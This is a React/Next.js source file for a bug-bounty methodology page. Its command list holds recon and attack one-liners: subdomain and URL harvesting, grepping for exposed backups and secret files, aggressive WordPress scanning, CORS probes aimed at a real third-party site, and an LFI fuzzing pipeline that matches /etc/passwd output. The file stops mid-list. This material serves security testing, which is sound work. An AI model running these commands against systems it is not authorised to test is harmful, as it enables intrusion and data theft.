'use client'

import React, { Suspense, useCallback, useState } from 'react'
import { motion } from 'framer-motion'
import { usePathname, useSearchParams } from 'next/navigation'

interface MethodologyCard {
  id: string
  title: string
  tags: string[]
}

const cards: MethodologyCard[] = [
  {
    id: 'recon-methodology',
    title: 'Advanced Recon Methodology',
    tags: ['methodology', 'recon']
  },
  {
    id: 'fetch-through-api',
    title: 'Gather assets through API',
    tags: ['methodology', 'recon', 'api']
  },
  {
    id: 'ssti-payloads',
    title: 'SSTI Payloads',
    tags: ['payloads', 'injection']
  },
  {
    id: 'crlf-injection',
    title: 'CRLF Injection',
    tags: ['payloads', 'injection', 'headers']
  },
  {
    id: 'sqli-methodology',
    title: 'SQL Injection Methodology',
    tags: ['methodology', 'payloads', 'sqli']
  },
  {
    id: 'xss-waf-bypass',
    title: 'XSS WAF Bypass Methodology',
    tags: ['xss', 'bypass', 'payloads']
  },
  {
    id: 'sqli-xor-waf-bypass',
    title: 'SQL Injection XOR WAF Bypass',
    tags: ['sqli', 'xor', 'payloads']
  },
  {
    id: 'google-dorks',
    title: 'Advanced Google Dorks',
    tags: ['google-hacking', 'google-dork']
  }
]

export function MethodologyView() {
  return (
    <Suspense fallback={<div />}> 
      <MethodologyViewInner />
    </Suspense>
  )
}

function MethodologyViewInner() {
  const pathname = usePathname()
  const searchParams = useSearchParams()
  const current = searchParams.get('methodology')
  const [domain, setDomain] = useState('example.com')
  const [inputValue, setInputValue] = useState('example.com')

  const handleGenerate = useCallback((e: React.FormEvent) => {
    e.preventDefault()
    if (inputValue.trim()) {
      setDomain(inputValue.trim())
    }
  }, [inputValue])

  if (current === 'recon-methodology') {
    return <div className="space-y-6">
      <DomainBar inputValue={inputValue} setInputValue={setInputValue} onGenerate={handleGenerate} />
      <MethodologyDetail pathname={pathname} domain={domain} />
    </div>
  }
  if (current === 'fetch-through-api') {
    return <div className="space-y-6">
      <DomainBar inputValue={inputValue} setInputValue={setInputValue} onGenerate={handleGenerate} />
      <MethodologyDetailAPI pathname={pathname} domain={domain} />
    </div>
  }
  if (current === 'ssti-payloads') {
    return <div className="space-y-6">
      <DomainBar inputValue={inputValue} setInputValue={setInputValue} onGenerate={handleGenerate} />
      <MethodologyDetailSSTI pathname={pathname} />
    </div>
  }
  if (current === 'crlf-injection') {
    return <div className="space-y-6">
      <DomainBar inputValue={inputValue} setInputValue={setInputValue} onGenerate={handleGenerate} />
      <MethodologyDetailCRLF pathname={pathname} domain={domain} />
    </div>
  }
  if (current === 'sqli-methodology') {
    return <div className="space-y-6">
      <DomainBar inputValue={inputValue} setInputValue={setInputValue} onGenerate={handleGenerate} />
      <MethodologyDetailSQLI pathname={pathname} domain={domain} />
    </div>
  }
  if (current === 'xss-waf-bypass') {
    return <div className="space-y-6">
      <DomainBar inputValue={inputValue} setInputValue={setInputValue} onGenerate={handleGenerate} />
      <MethodologyDetailXSSWAF pathname={pathname} />
    </div>
  }
  if (current === 'sqli-xor-waf-bypass') {
    return <div className="space-y-6">
      <DomainBar inputValue={inputValue} setInputValue={setInputValue} onGenerate={handleGenerate} />
      <MethodologyDetailSQLIXOR pathname={pathname} />
    </div>
  }
  if (current === 'google-dorks') {
    return <div className="space-y-6">
      <DomainBar inputValue={inputValue} setInputValue={setInputValue} onGenerate={handleGenerate} />
      <MethodologyDetailGoogleDorks pathname={pathname} />
    </div>
  }

  return (
    <div className="space-y-4 px-4 md:px-0">
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4 md:gap-6">
        {cards.map((card) => (
          <motion.div
            key={card.id}
            className="projects h-full border border-border rounded-lg p-3 md:p-4 bg-card hover:bg-accent/50 transition-colors flex flex-col"
          >
            <div className="space-y-3 md:space-y-4 flex-1 flex flex-col">
              <h3 className="text-base md:text-lg font-semibold leading-tight">{card.title}</h3>
              <div className="flex flex-wrap gap-1.5 md:gap-2">
                {card.tags.map((tag) => (
                  <span key={tag} className="inline-flex items-center gap-1 rounded border border-border bg-muted text-muted-foreground px-2 py-0.5 text-xs">
                    <i className="fas fa-hashtag"></i>
                    {tag}
                  </span>
                ))}
              </div>
              <div className="pt-2 mt-auto">
                <a
                  href={`${pathname}?methodology=${encodeURIComponent(card.id)}`}
                  className="inline-flex items-center gap-2 px-3 md:px-4 py-2 text-xs md:text-sm font-medium text-primary-foreground bg-primary hover:bg-primary/90 rounded-md transition-colors no-underline focus:outline-none focus:ring-0 border-0 w-full justify-center"
                >
                  <i className="fas fa-terminal"></i>
                  <span className="hidden sm:inline">View Methodology</span>
                  <span className="sm:hidden">View</span>
                  <i className="fas fa-external-link-alt text-xs"></i>
                </a>
              </div>
            </div>
          </motion.div>
        ))}
      </div>
    </div>
  )
}

function DomainBar({ inputValue, setInputValue, onGenerate }: { inputValue: string, setInputValue: (v: string) => void, onGenerate: (e: React.FormEvent) => void }) {
  return (
    <div className="text-center mb-8">
      <form onSubmit={onGenerate} className="flex gap-2 max-w-md mx-auto">
        <input
          type="text"
          value={inputValue}
          onChange={(e) => setInputValue(e.target.value)}
          placeholder="example.com"
          className="flex-1 px-3 py-2 border border-border rounded-md bg-background"
          required
        />
        <button
          type="submit"
          className="px-4 py-2 bg-primary text-primary-foreground rounded-md hover:bg-primary/90 transition-colors"
        >
          Generate
        </button>
      </form>
    </div>
  )
}

function MethodologyDetail({ pathname, domain }: { pathname: string, domain: string }) {
  const [notification, setNotification] = useState('')
  const [showNotification, setShowNotification] = useState(false)

  const showNotificationMessage = (message: string) => {
    setNotification(message)
    setShowNotification(true)
    window.setTimeout(() => setShowNotification(false), 2000)
  }

  const replaceDomain = useCallback((text: string) => {
    return text
      .replace(/example\.com/g, domain)
      .replace(/site\.com/g, domain)
      .replace(/target\.com/g, domain)
  }, [domain])

  const handleCopy = useCallback(async (text: string) => {
    try {
      await navigator.clipboard.writeText(text)
      showNotificationMessage('Command copied to clipboard!')
    } catch {
      showNotificationMessage('Failed to copy command')
    }
  }, [])

  return (
    <div className="space-y-4 md:space-y-6 px-4 md:px-0">
      {showNotification && (
        <div className="fixed top-4 right-4 bg-primary text-primary-foreground px-4 py-2 rounded-md shadow-lg z-50 text-sm">
          {notification}
        </div>
      )}
      <div className="flex items-center justify-between">
        <a href={pathname} className="back-btn inline-flex items-center gap-2 px-3 py-2 rounded-md bg-muted text-foreground shadow-sm hover:bg-accent/50 transition-colors no-underline border-0 focus:outline-none focus:ring-0 text-sm">
          <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
          Back
        </a>
      </div>

      <h2 className="methodology-title text-xl md:text-2xl font-bold flex items-center gap-2 leading-tight">
        <i className="fas fa-code text-lg md:text-xl"></i>
        <span className="break-words">Advanced Recon Methodology</span>
      </h2>

      <div className="methodology-category text-sm text-muted-foreground">Web Security</div>

      <div className="commands-section space-y-3 md:space-y-4">
        {COMMAND_BLOCKS.map((block) => (
          <div key={block.command} className="methodology-command-block space-y-2">
            <div className="terminal-box flex flex-col sm:flex-row sm:items-center justify-between gap-2 border border-border rounded-md p-3 bg-card">
              <div className="flex items-start gap-2 overflow-x-auto min-w-0 flex-1">
                <span className="prompt text-primary font-mono select-none text-sm flex-shrink-0">$</span>
                <span className="command font-mono text-xs sm:text-sm break-all whitespace-pre-wrap leading-relaxed">{replaceDomain(block.command)}</span>
              </div>
              <button
                className="p-2 hover:bg-accent rounded transition-colors flex-shrink-0 self-start sm:self-center"
                onClick={() => handleCopy(replaceDomain(block.raw))}
                aria-label="Copy command"
                title="Copy command"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                </svg>
              </button>
            </div>
            <div className="command-info text-xs text-muted-foreground flex items-start gap-2">
              <i className="fas fa-info-circle flex-shrink-0 mt-0.5"></i>
              <span className="break-words">{block.info}</span>
            </div>
          </div>
        ))}
      </div>

      <div className="tips-section">
        <h3 className="text-base md:text-lg font-semibold flex items-center gap-2 mb-3">
          <i className="fas fa-lightbulb text-sm md:text-base"></i> 
          <span>Tips &amp; Best Practices</span>
        </h3>
        <ul className="tips-list list-disc pl-5 space-y-2">
          {TIPS.map((tip) => (
            <li key={tip} className="text-sm leading-relaxed">
              <i className="fas fa-check-circle mr-2 text-green-500"></i>
              <span className="break-words">{tip}</span>
            </li>
          ))}
        </ul>
      </div>
    </div>
  )
}

function MethodologyDetailAPI({ pathname, domain }: { pathname: string, domain: string }) {
  const [notification, setNotification] = useState('')
  const [showNotification, setShowNotification] = useState(false)

  const showNotificationMessage = (message: string) => {
    setNotification(message)
    setShowNotification(true)
    window.setTimeout(() => setShowNotification(false), 2000)
  }

  const replaceDomain = useCallback((text: string) => {
    return text
      .replace(/example\.com/g, domain)
      .replace(/site\.com/g, domain)
      .replace(/target\.com/g, domain)
      .replace(/<DOMAIN>/g, domain)
  }, [domain])

  const handleCopy = useCallback(async (text: string) => {
    try {
      await navigator.clipboard.writeText(text)
      showNotificationMessage('Command copied to clipboard!')
    } catch {
      showNotificationMessage('Failed to copy command')
    }
  }, [])

  return (
    <div className="space-y-4 md:space-y-6 px-4 md:px-0">
      {showNotification && (
        <div className="fixed top-4 right-4 bg-primary text-primary-foreground px-4 py-2 rounded-md shadow-lg z-50 text-sm">
          {notification}
        </div>
      )}
      <div className="flex items-center justify-between">
        <a href={pathname} className="back-btn inline-flex items-center gap-2 px-3 py-2 rounded-md bg-muted text-foreground shadow-sm hover:bg-accent/50 transition-colors no-underline border-0 focus:outline-none focus:ring-0 text-sm">
          <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
          Back
        </a>
      </div>

      <h2 className="methodology-title text-xl md:text-2xl font-bold flex items-center gap-2 leading-tight">
        <i className="fas fa-code text-lg md:text-xl"></i>
        <span className="break-words">Gather assets through API</span>
      </h2>

      <div className="methodology-category text-sm text-muted-foreground">Web Security</div>

      <div className="commands-section space-y-3 md:space-y-4">
        {COMMAND_BLOCKS_API.map((block) => (
          <div key={block.command} className="methodology-command-block space-y-2">
            <div className="terminal-box flex flex-col sm:flex-row sm:items-center justify-between gap-2 border border-border rounded-md p-3 bg-card">
              <div className="flex items-start gap-2 overflow-x-auto min-w-0 flex-1">
                <span className="prompt text-primary font-mono select-none text-sm flex-shrink-0">$</span>
                <span className="command font-mono text-xs sm:text-sm break-all whitespace-pre-wrap leading-relaxed">{replaceDomain(block.command)}</span>
              </div>
              <button
                className="p-2 hover:bg-accent rounded transition-colors flex-shrink-0 self-start sm:self-center"
                onClick={() => handleCopy(replaceDomain(block.raw))}
                aria-label="Copy command"
                title="Copy command"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                </svg>
              </button>
            </div>
            <div className="command-info text-xs text-muted-foreground flex items-start gap-2">
              <i className="fas fa-info-circle flex-shrink-0 mt-0.5"></i>
              <span className="break-words">{block.info}</span>
            </div>
          </div>
        ))}
      </div>

      <div className="tips-section">
        <h3 className="text-base md:text-lg font-semibold flex items-center gap-2 mb-3">
          <i className="fas fa-lightbulb text-sm md:text-base"></i> 
          <span>Tips &amp; Best Practices</span>
        </h3>
        <ul className="tips-list list-disc pl-5 space-y-2">
          {TIPS_API.map((tip) => (
            <li key={tip} className="text-sm leading-relaxed">
              <i className="fas fa-check-circle mr-2 text-green-500"></i>
              <span className="break-words">{tip}</span>
            </li>
          ))}
        </ul>
      </div>
    </div>
  )
}

function MethodologyDetailSSTI({ pathname }: { pathname: string }) {
  return (
    <div className="space-y-4 md:space-y-6 px-4 md:px-0">
      <div className="flex items-center justify-between">
        <a href={pathname} className="back-btn inline-flex items-center gap-2 px-3 py-2 rounded-md bg-muted text-foreground shadow-sm hover:bg-accent/50 transition-colors no-underline border-0 focus:outline-none focus:ring-0 text-sm">
          <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
          Back
        </a>
      </div>

      <h2 className="methodology-title text-xl md:text-2xl font-bold flex items-center gap-2 leading-tight">
        <i className="fas fa-code text-lg md:text-xl"></i>
        <span className="break-words">SSTI Payloads</span>
      </h2>

      <div className="methodology-category text-sm text-muted-foreground">Web Security</div>

      <div className="commands-section space-y-3 md:space-y-4">
        <p className="text-sm">No commands available.</p>
      </div>

      <div className="tips-section">
        <h3 className="text-base md:text-lg font-semibold flex items-center gap-2 mb-3">
          <i className="fas fa-lightbulb text-sm md:text-base"></i> 
          <span>Tips &amp; Best Practices</span>
        </h3>
        <ul className="tips-list list-disc pl-5 space-y-2">
          {TIPS_SSTI.map((tip) => (
            <li key={tip} className="text-sm leading-relaxed">
              <i className="fas fa-check-circle mr-2 text-green-500"></i>
              <span className="break-words">{tip}</span>
            </li>
          ))}
        </ul>
      </div>
    </div>
  )
}

function MethodologyDetailCRLF({ pathname, domain }: { pathname: string, domain: string }) {
  const [notification, setNotification] = useState('')
  const [showNotification, setShowNotification] = useState(false)

  const showNotificationMessage = (message: string) => {
    setNotification(message)
    setShowNotification(true)
    window.setTimeout(() => setShowNotification(false), 2000)
  }

  const replaceDomain = useCallback((text: string) => {
    return text
      .replace(/example\.com/g, domain)
      .replace(/site\.com/g, domain)
      .replace(/target\.com/g, domain)
  }, [domain])

  const handleCopy = useCallback(async (text: string) => {
    try {
      await navigator.clipboard.writeText(text)
      showNotificationMessage('Command copied to clipboard!')
    } catch {
      showNotificationMessage('Failed to copy command')
    }
  }, [])

  return (
    <div className="space-y-4 md:space-y-6 px-4 md:px-0">
      {showNotification && (
        <div className="fixed top-4 right-4 bg-primary text-primary-foreground px-4 py-2 rounded-md shadow-lg z-50 text-sm">
          {notification}
        </div>
      )}
      <div className="flex items-center justify-between">
        <a href={pathname} className="back-btn inline-flex items-center gap-2 px-3 py-2 rounded-md bg-muted text-foreground shadow-sm hover:bg-accent/50 transition-colors no-underline border-0 focus:outline-none focus:ring-0 text-sm">
          <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
          Back
        </a>
      </div>

      <h2 className="methodology-title text-xl md:text-2xl font-bold flex items-center gap-2 leading-tight">
        <i className="fas fa-code text-lg md:text-xl"></i>
        <span className="break-words">CRLF Injection</span>
      </h2>

      <div className="methodology-category text-sm text-muted-foreground">Web Security</div>

      <div className="commands-section space-y-3 md:space-y-4">
        {COMMAND_BLOCKS_CRLF.map((block) => (
          <div key={block.command} className="methodology-command-block space-y-2">
            <div className="terminal-box flex flex-col sm:flex-row sm:items-center justify-between gap-2 border border-border rounded-md p-3 bg-card">
              <div className="flex items-start gap-2 overflow-x-auto min-w-0 flex-1">
                <span className="prompt text-primary font-mono select-none text-sm flex-shrink-0">$</span>
                <span className="command font-mono text-xs sm:text-sm break-all whitespace-pre-wrap leading-relaxed">{replaceDomain(block.command)}</span>
              </div>
              <button
                className="p-2 hover:bg-accent rounded transition-colors flex-shrink-0 self-start sm:self-center"
                onClick={() => handleCopy(replaceDomain(block.raw))}
                aria-label="Copy command"
                title="Copy command"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                </svg>
              </button>
            </div>
            <div className="command-info text-xs text-muted-foreground flex items-start gap-2">
              <i className="fas fa-info-circle flex-shrink-0 mt-0.5"></i>
              <span className="break-words">{block.info}</span>
            </div>
          </div>
        ))}
      </div>

      <div className="tips-section">
        <h3 className="text-base md:text-lg font-semibold flex items-center gap-2 mb-3">
          <i className="fas fa-lightbulb text-sm md:text-base"></i> 
          <span>Tips &amp; Best Practices</span>
        </h3>
        <ul className="tips-list list-disc pl-5 space-y-2">
          {TIPS_CRLF.map((tip) => (
            <li key={tip} className="text-sm leading-relaxed">
              <i className="fas fa-check-circle mr-2 text-green-500"></i>
              <span className="break-words">{tip}</span>
            </li>
          ))}
        </ul>
      </div>
    </div>
  )
}

function MethodologyDetailSQLI({ pathname, domain }: { pathname: string, domain: string }) {
  const [notification, setNotification] = useState('')
  const [showNotification, setShowNotification] = useState(false)

  const showNotificationMessage = (message: string) => {
    setNotification(message)
    setShowNotification(true)
    window.setTimeout(() => setShowNotification(false), 2000)
  }

  const replaceDomain = useCallback((text: string) => {
    return text
      .replace(/example\.com/g, domain)
      .replace(/site\.com/g, domain)
      .replace(/target\.com/g, domain)
  }, [domain])

  const handleCopy = useCallback(async (text: string) => {
    try {
      await navigator.clipboard.writeText(text)
      showNotificationMessage('Command copied to clipboard!')
    } catch {
      showNotificationMessage('Failed to copy command')
    }
  }, [])

  return (
    <div className="space-y-4 md:space-y-6 px-4 md:px-0">
      {showNotification && (
        <div className="fixed top-4 right-4 bg-primary text-primary-foreground px-4 py-2 rounded-md shadow-lg z-50 text-sm">
          {notification}
        </div>
      )}
      <div className="flex items-center justify-between">
        <a href={pathname} className="back-btn inline-flex items-center gap-2 px-3 py-2 rounded-md bg-muted text-foreground shadow-sm hover:bg-accent/50 transition-colors no-underline border-0 focus:outline-none focus:ring-0 text-sm">
          <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
          Back
        </a>
      </div>

      <h2 className="methodology-title text-xl md:text-2xl font-bold flex items-center gap-2 leading-tight">
        <i className="fas fa-code text-lg md:text-xl"></i>
        <span className="break-words">SQL Injection Methodology</span>
      </h2>

      <div className="methodology-category text-sm text-muted-foreground">Web Security</div>

      <div className="commands-section space-y-3 md:space-y-4">
        {COMMAND_BLOCKS_SQLI.map((block) => (
          <div key={block.command} className="methodology-command-block space-y-2">
            <div className="terminal-box flex flex-col sm:flex-row sm:items-center justify-between gap-2 border border-border rounded-md p-3 bg-card">
              <div className="flex items-start gap-2 overflow-x-auto min-w-0 flex-1">
                <span className="prompt text-primary font-mono select-none text-sm flex-shrink-0">$</span>
                <span className="command font-mono text-xs sm:text-sm break-all whitespace-pre-wrap leading-relaxed">{replaceDomain(block.command)}</span>
              </div>
              <button
                className="p-2 hover:bg-accent rounded transition-colors flex-shrink-0 self-start sm:self-center"
                onClick={() => handleCopy(replaceDomain(block.raw))}
                aria-label="Copy command"
                title="Copy command"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                </svg>
              </button>
            </div>
            <div className="command-info text-xs text-muted-foreground flex items-start gap-2">
              <i className="fas fa-info-circle flex-shrink-0 mt-0.5"></i>
              <span className="break-words">{block.info}</span>
            </div>
          </div>
        ))}
      </div>

      <div className="tips-section">
        <h3 className="text-base md:text-lg font-semibold flex items-center gap-2 mb-3">
          <i className="fas fa-lightbulb text-sm md:text-base"></i> 
          <span>Tips &amp; Best Practices</span>
        </h3>
        <ul className="tips-list list-disc pl-5 space-y-2">
          {TIPS_SQLI.map((tip) => (
            <li key={tip} className="text-sm leading-relaxed">
              <i className="fas fa-check-circle mr-2 text-green-500"></i>
              <span className="break-words">{tip}</span>
            </li>
          ))}
        </ul>
      </div>
    </div>
  )
}

function MethodologyDetailXSSWAF({ pathname }: { pathname: string }) {
  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <a href={pathname} className="back-btn inline-flex items-center gap-2 px-3 py-2 rounded-md bg-muted text-foreground shadow-sm hover:bg-accent/50 transition-colors no-underline border-0 focus:outline-none focus:ring-0">
          <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
          Back
        </a>
      </div>

      <h2 className="methodology-title text-2xl font-bold flex items-center gap-2">
        <i className="fas fa-code"></i>
        XSS WAF Bypass Methodology
      </h2>

      <div className="methodology-category text-sm text-muted-foreground">Web Security</div>

      <div className="commands-section space-y-4">
        <p className="text-sm">No commands available.</p>
      </div>

      <div className="tips-section">
        <h3 className="text-lg font-semibold flex items-center gap-2"><i className="fas fa-lightbulb"></i> Tips &amp; Best Practices</h3>
        <ul className="tips-list list-disc pl-5 space-y-1">
          {TIPS_XSS_WAF.map((tip) => (
            <li key={tip} className="text-sm">
              <i className="fas fa-check-circle mr-2"></i>
              {tip}
            </li>
          ))}
        </ul>
      </div>
    </div>
  )
}

function MethodologyDetailSQLIXOR({ pathname }: { pathname: string }) {
  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <a href={pathname} className="back-btn inline-flex items-center gap-2 px-3 py-2 rounded-md bg-muted text-foreground shadow-sm hover:bg-accent/50 transition-colors no-underline border-0 focus:outline-none focus:ring-0">
          <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
          Back
        </a>
      </div>

      <h2 className="methodology-title text-2xl font-bold flex items-center gap-2">
        <i className="fas fa-code"></i>
        SQL Injection XOR WAF Bypass Methodology
      </h2>

      <div className="methodology-category text-sm text-muted-foreground">Web Security</div>

      <div className="commands-section space-y-4">
        <p className="text-sm">No commands available.</p>
      </div>

      <div className="tips-section">
        <h3 className="text-lg font-semibold flex items-center gap-2"><i className="fas fa-lightbulb"></i> Tips &amp; Best Practices</h3>
        <ul className="tips-list list-disc pl-5 space-y-1">
          {TIPS_SQLI_XOR.map((tip) => (
            <li key={tip} className="text-sm">
              <i className="fas fa-check-circle mr-2"></i>
              {tip}
            </li>
          ))}
        </ul>
      </div>
    </div>
  )
}

function MethodologyDetailGoogleDorks({ pathname }: { pathname: string }) {
  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <a href={pathname} className="back-btn inline-flex items-center gap-2 px-3 py-2 rounded-md bg-muted text-foreground shadow-sm hover:bg-accent/50 transition-colors no-underline border-0 focus:outline-none focus:ring-0">
          <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
          Back
        </a>
      </div>

      <h2 className="methodology-title text-2xl font-bold flex items-center gap-2">
        <i className="fas fa-code"></i>
        Advanced Google Dorks Methodology
      </h2>

      <div className="methodology-category text-sm text-muted-foreground">Web Security</div>

      <div className="commands-section space-y-4">
        <p className="text-sm">No commands available.</p>
      </div>

      <div className="tips-section">
        <h3 className="text-lg font-semibold flex items-center gap-2"><i className="fas fa-lightbulb"></i> Tips &amp; Best Practices</h3>
        <ul className="tips-list list-disc pl-5 space-y-1">
          {TIPS_GOOGLE_DORKS.map((tip) => (
            <li key={tip} className="text-sm">
              <i className="fas fa-check-circle mr-2"></i>
              {tip}
            </li>
          ))}
        </ul>
      </div>
    </div>
  )
}

interface CommandBlockDef {
  command: string
  raw: string
  info: string
}

const COMMAND_BLOCKS: CommandBlockDef[] = [
  {
    command: 'subfinder -d example.com -all -recursive > subdomain.txt',
    raw: 'subfinder -d example.com -all -recursive > subdomain.txt',
    info: 'For finding subdomains',
  },
  {
    command: 'cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt',
    raw: 'cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt',
    info: 'For filter out live subdomains',
  },
  {
    command: 'katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt',
    raw: 'katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt',
    info: 'For fetching passive urls',
  },
  {
    command: "cat allurls.txt | grep -E '.xls|.xml|.xlsx|.json|.pdf|.sql|.doc|.docx|.pptx|.txt|.zip|.tar.gz|.tgz|.bak|.7z|.rar|.log|.cache|.secret|.db|.backup|.yml|.gz|.config|.csv|.yaml|.md|.md5'",
    raw: "cat allurls.txt | grep -E '.xls|.xml|.xlsx|.json|.pdf|.sql|.doc|.docx|.pptx|.txt|.zip|.tar.gz|.tgz|.bak|.7z|.rar|.log|.cache|.secret|.db|.backup|.yml|.gz|.config|.csv|.yaml|.md|.md5'",
    info: 'For finding sensitive files',
  },
  {
    command: 'echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt',
    raw: 'echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt',
    info: 'For fetch and sorting urls - part 1',
  },
  {
    command: "katana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txt",
    raw: "katana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txt",
    info: 'For fetch and sorting urls - part 2',
  },
  {
    command: "cat output.txt | sed 's/=.*/=/' >final.txt",
    raw: "cat output.txt | sed 's/=.*/=/' >final.txt",
    info: 'For fetch and sorting urls - part 3',
  },
  {
    command: 'echo example.com | gau --mc 200 | urldedupe >urls.txt',
    raw: 'echo example.com | gau --mc 200 | urldedupe >urls.txt',
    info: 'For fetch and sorting urls - part 4',
  },
  {
    command: "cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > output.txt",
    raw: "cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > output.txt",
    info: 'For fetch and sorting urls - part 5',
  },
  {
    command: "cat output.txt | sed 's/=.*/=/' >final.txt",
    raw: "cat output.txt | sed 's/=.*/=/' >final.txt",
    info: 'For fetch and sorting urls - part 6',
  },
  {
    command: "arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'",
    raw: "arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'",
    info: 'For finding hidden parameter - part 1',
  },
  {
    command: "arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'",
    raw: "arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'",
    info: 'For finding hidden parameter - part 2',
  },
  {
    command: "curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/",
    raw: "curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/",
    info: 'For checking CORS - part 1',
  },
  {
    command: "curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'",
    raw: "curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'",
    info: 'For checking CORS - part 2',
  },
  {
    command: "site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)",
    raw: "site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)",
    info: 'Information Disclosure dork',
  },
  {
    command: 'wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force',
    raw: 'wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force',
    info: 'Wordpress aggressive scanning',
  },
  {
    command: "echo 'https://example.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\*|\$[^\:]*):0:0:' -v",
